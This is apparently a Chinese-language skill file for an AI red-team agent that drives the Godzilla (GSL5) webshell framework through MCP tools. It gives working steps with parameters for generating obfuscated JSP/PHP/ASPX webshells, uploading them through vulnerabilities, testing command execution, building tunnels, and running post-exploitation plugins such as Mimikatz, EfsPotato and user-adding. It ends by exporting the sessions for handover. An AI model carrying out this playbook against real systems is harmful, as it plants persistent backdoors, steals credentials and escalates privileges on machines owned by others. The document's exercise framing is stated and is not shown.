---
name: webshell-toolkit
description: GSL5 哥斯拉 MCP（mcp__godzilla__*）生成、上传、上线、操作 WebShell 的完整流程；以及 MCP 不可用时的手工兜底
whenToUse: 已获得上传点/文件写入/命令执行，需要落地并管理 WebShell 时
role: exploit
enabled: true
---

# WebShell 工具包（GSL5 哥斯拉 MCP 主线）

> **默认通道是 GSL5（GodzillaSuper）哥斯拉 MCP**：`mcp__godzilla__*` —— 生成马、上传、上线、
> 命令、文件、数据库、主机信息都在里面（**没有内存马工具**，内存马/被查杀走技能 `memshell-fallback`）。
> **进程不常驻**：插件不会自动拉起 GSL5。先在工具目录里确认 `mcp__godzilla__` 前缀在不在；
> 若行状态是「**GSL5 未运行 —— 点启动**」，**请让用户到演练台「MCP」页签点「启动 GSL5」**（你点不了按钮），
> 起来后该行会自动重连；只有整条 jar 都没装（`toolkit/gsl5/gsl5.jar` 不存在）才走文末「兜底」。

## 一、生成马

```
mcp__godzilla__shell_create {
  cryption: "JAVA_AES_BASE64",     # 必填；支持模糊名（aesbase64 / java_c2 / gzip …），精确名以 payload_list 为准
  password: "Rt@2026#xz",          # 连接密码（随机生成，别用默认）
  secretKey: "0123456789abcdef",   # 密钥（连接密钥由 GSL5 按 cryption 派生）
  payload: "JavaDynamicPayload",   # 载荷类型；默认 JavaDynamicPayload
  genFile: "/tmp/rt-shell.jsp",    # 必填：生成的文件落到本机这个路径
  obfuscation: "default"           # 可选：none / superObfuscation / superUnicode / superHex / superXml / superRandom / superDouble
}
```

- **语言 → payload / cryption**：JSP/JSPX = `JavaDynamicPayload` + `JAVA_AES_BASE64`；
  PHP = `PhpDynamicPayload` + `PHP_XOR_BASE64`（或 `PHP_EVAL_XOR_BASE64`）；
  C#/aspx/asmx/ashx = `CSharpDynamicPayload` + `CSHARP_AES_BASE64`（或 `CSHARP_ASMX_AES_BASE64`）；
  ASP = `AspDynamicPayload` + `ASP_XOR_BASE64`。载荷与加密器全表以 `mcp__godzilla__payload_list` 为准。
- **连接三要素都要留住**：`password` + `secretKey` + `cryption`（外加 `payload` 类型）。
  少一样用户连不上——登记时 `pass_key` 写密码、`cryption` 写加密方式、`secret_ref` 指向交付物。

## 二、上传与上线

1. **上传**：优先走**漏洞自身的上传点**，或命令执行面（把 `genFile` 内容按 base64 管道写到目标路径）。
   注意 **GSL5 的文件工具都按 `shellId` 操作已登记的会话**，初次落地时还没有 shellId，用不上它们。
2. **上线并实测**（这两步不能省）：

```
mcp__godzilla__shell_add   { url, password, secretKey, payload: "JavaDynamicPayload", cryption }   # 只保存配置、不连接；返回 Shell ID
mcp__godzilla__shell_test  { shellId }                                                             # 实测能连（拿 shell_list 的 id）
mcp__godzilla__shell_exec  { shellId, command: "id; uname -a" }                                    # 实测能执行，回显写进证据
```

- **一律按 `shellId` 定位**：`shell_add` 返回、`shell_list` 可查；没有按 URL 寻址的写法。
- `shell_exec` 的 `command` 直接写（Windows 多行命令 GSL5 会自动包 `cmd /c`）。
- 实测通过后 —— **立刻建隧道**（技能 `tunnel-selection`），别停在"有个马"。

## 三、日常操作（都在 GSL5 里，按 `shellId`）

| 要做的事 | 工具 |
|---|---|
| 命令执行 | `shell_exec` |
| 文件 | `file_list` `file_read` `file_upload_local` `file_download_local` `file_delete` `file_copy` `file_move` `file_mkdir` `file_attr` `file_remote_down` `file_roots` `file_search` |
| 数据库 | `db_connect` `db_exec` `db_databases` `db_tables` `db_preview` `db_count` `db_list_types` `db_configs` |
| 主机信息 | `shell_info`（把当前用户/系统信息一并带回）`process_list` `net_info` |
| 编码 | `shell_detect_encoding` 自动探测；命令/文件类工具多带 `encoding`（GBK/UTF-8/auto） |
| 环境变量 | `shell_env`（`action` = get/set/del/list） |
| 会话批量 | `shell_list` `shell_count` `shell_search` `shell_batch_test` `shell_clone` `shell_edit` `shell_delete` `shell_backup` `shell_export` `shell_import` |
| 载荷/模板 | `payload_list`、`c2profile_list` / `c2profile_get`（C2 类加密器生成 Shell 时选模板） |
| 插件工具 | `plugin_*`（如 `plugin_Mimikatz_run`、`plugin_TH_TOOLS_exec`、`plugin_EfsPotato_run`、`plugin_ShellAvscanPlugin_scan`、`plugin_Useradd_adduser`、`plugin_OaTools_proxy`、`plugin_NewCmd_info1/info2/exec`、`plugin_ClassLoader_run`；名字与参数以工具目录为准） |
| MCP 自身 | `mcp_status` `mcp_config` `settings_get` `settings_set` `config_read` `config_write` `oplog_query` |

命令执行里要"写文件"、装卸载荷时，都用上表的 **`file_*` / `plugin_*`** 系列，不要凭记忆拼别的工具名。

## 四、登记与交付

- **`mcp__godzilla__shell_export {shellId}` 把会话导出成 `gsl5://import?data=…` 链接** —— 这就是
  给用户的交付物（用户在 GSL5 里点导入即得到同一条会话）；把链接写进 `secret_ref` / `note`。
- 登记：

```
redteam_webshell_add {
  url, shell_type: "godzilla", pass_key: "<密码>", cryption: "JAVA_AES_BASE64",
  privilege: "www-data", secret_ref: "gsl5://import?data=…", note: "实测 shell_exec 回显见证据"
}
```

`redteam_chain_add` 里把**实际调用的 MCP 工具与参数**写进 `tool`（例：`mcp__godzilla__shell_exec {shellId: "…", command: "id"}`），`result` 写回显。

## 五、MCP 不可用时的兜底

只有 `mcp__godzilla__*` 前缀在工具目录里搜不到时才走这条路：

1. 让用户到「MCP」页签点「启动 GSL5」（jar 已在就位时）；jar 缺失 → 跑 `bash "$DSH_HOME/redteam/setup.sh" --yes` 拉 `toolkit/gsl5/gsl5.jar`（Release 3.1.8，`--gsl5-jar` 可自备），重启 `dsh web`；
2. 实在装不了（无 Java 权限等）→ **如实回报指挥者**并说明"WebShell 只能作临时中转，无法交付可直连入口"；
3. 不得自行拼装其它马对外交付。
